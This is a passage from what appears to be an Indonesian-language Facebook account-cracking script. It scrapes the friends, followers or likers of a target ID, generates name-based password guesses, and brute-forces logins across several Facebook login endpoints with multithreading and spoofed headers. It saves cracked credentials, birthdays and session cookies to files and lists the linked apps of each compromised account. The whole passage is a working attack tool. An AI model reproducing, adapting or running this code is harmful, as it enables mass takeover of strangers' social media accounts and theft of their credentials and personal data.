        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,H,M,H))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
        exit()
    try:
        print('%s╠══[%s•%s] %sMASUKAN ID'%(H,O,H,K))
        it = input("%s╠══[%s•%s] %sID Target : "%(H,O,H,K))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(H,O,H,K,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Tersedia'%(M,H,M,H))
            menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(H,O,H,K,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,H,M,H,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,H,M,H))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
        exit()
    try:
        print('%s╠══[%s•%s] %sMasukan ID '%(H,O,H,K))
        it = input("%s╠══[%s•%s] %sID Target : "%(H,O,H,K))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(H,O,H,K,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Tersedia'%(M,H,M,H))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(H,O,H,K,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,H,M,H,e))
def likers():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,H,M,H))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Salah/Kadaluarsa'%(M,H,M,H))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,H,M,H))
        exit()
    try:
        print('%s╠══[%s•%s] %sMasukan ID'%(H,O,H,K))
        it = input("%s╠══[%s•%s] %sID Target : "%(H,O,H,K))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(H,O,H,K,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Tersedia'%(M,H,M,H))
            menu()
        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(H,O,H,K,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,H,M,H,e))
def generate1(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"786")
                _dapunta_.append(i+"1122")
            elif len(i)>=6:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"786")
                _dapunta_.append(i+"1122")
            else:
                continue
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def generate2(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("sayang")
    _dapunta_.append("bangsat")
    _dapunta_.append("anjing")
    return _dapunta_
def generate3(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("memek")
    _dapunta_.append("kontol")
    _dapunta_.append("ngentot")
    _dapunta_.append("goblok")
    _dapunta_.append("anjing")
    _dapunta_.append("sayang")
    return _dapunta_
def generate4(_cici_):
    _dapunta_=[]
    ps = open('pass.txt','r').read()
    pp = open('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"1234")
            _dapunta_.append(i+"1122")
            _dapunta_.append(i+"786")
        else:
            _dapunta_.append(i)
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"1234")
            _dapunta_.append(i+"1122")
            _dapunta_.append(i+"786")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def tambah_pass():
    print('%s║'%(H))
    print('%s╠══[%s•%s] %sFor Example :  hikmat,123456,786786'%(H,O,H,K))
    cuy = input('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(H,O,H,K))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s╠══[%s•%s] %sFor Example : 321,786,1122,123'%(H,O,H,K))
    coy = input('%s╠══[%s•%s] %sEnter Additional Pass Behind Name : '%(H,O,H,K))
    xy = open('passangka.txt','w')
    xy.write(coy)
    xy.close
    
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
        elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' • 2015'
        elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' • 2018'
        elif fx[:5] in ['10004']           :tahunz = ' • 2019'
        elif fx[:5] in ['10005']           :tahunz = ' • 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' • 2008/2009'
    elif len(fx)==8:
        tahunz = ' • 2007/2008'
    elif len(fx)==7:
        tahunz = ' • 2006/2007'
    else:tahunz=''
    return tahunz
class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack Untuk Password Default/Manual [d/m]'%(H,O,H,K))
        while True:
            f = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
            if f=="":
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                menu()
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %sFor example : hikmat,786786,123456'%(H,O,H,K))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    start_methodezz()
                    kopi = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                    if kopi in ['']:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                        menu()
                    elif kopi in ['1','01']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
                            except:continue
                    elif kopi in ['2','02']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
                            except:continue
                    elif kopi in ['3','03']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
                            except:continue
                    elif kopi in ['4','04']:
                        os.system('rm -rf pass.txt')
                        os.system('rm -rf passangka.txt')
                        tambah_pass()
                        tambah_pass_angka()
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
                            except:continue
                    else:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                        menu()
                    start_method()
                    put = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                    print('%s║'%(O))
                    if put in ['']:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                        menu()
                    elif put in ['1','01','001','a']:
                        print('%s╠══[%s•%s] %sPakai Opsi Checkpoint? [y/t]'%(H,O,H,K))
                        puf = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.api_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.api,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                            menu()
                    elif put in ['2','02','002','b']:
                        print('%s╠══[%s•%s] %sPakai Opsi Checkpoint? [y/t]'%(H,O,H,K))
                        puf = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.mbasic_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.mbasic,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                            menu()
                    elif put in ['3','03','003','c']:
                        print('%s╠══[%s•%s] %sPakai Opsi Checkpoint? [y/t]'%(H,O,H,K))
                        puf = input('%s╠══[%s•%s] %sChoose : '%(H,O,H,K))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.free_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.free,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                            menu()
                    else:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                        menu()
                except Exception as e:
                    print(("   %s"%e))
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %sEnter Password : '%(H,O,H,K)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
            print('%s║'%(H))
            if put in ['']:
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                menu()
            elif put in ['1','01','001','a']:
                print('%s╠══[%s•%s] %sPakai Opsi Checkpoint? [y/t]'%(H,O,H,K))
                puf = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.api_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.api,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                    menu()
            elif put in ['2','02','002','b']:
                print('%s╠══[%s•%s] %sPakai Opsi Checkpoint? [y/t]'%(H,O,H,K))
                puf = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.mbasic_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.mbasic,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                    menu()
            elif put in ['3','03','003','c']:
                print('%s╠══[%s•%s] %sPakai Opsi Checkpoint? [y/t]'%(H,O,H,K))
                puf = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                    menu()
                elif puf in ['1','01','001','y','Y']:
                    started()
                    ThreadPool(30).map(self.free_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['2','02','002','t','T']:
                    started()
                    ThreadPool(30).map(self.free,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                    menu()
            else:
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
                menu()
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sHikmat%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%Hikmat%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sjeeck%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sMat x Putri x Ndrii%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sHikmat%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sHikmat%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sHikmat%s] %s • %s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id"))))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sMat%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sHikmat%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sHikmat%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sHikmat%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
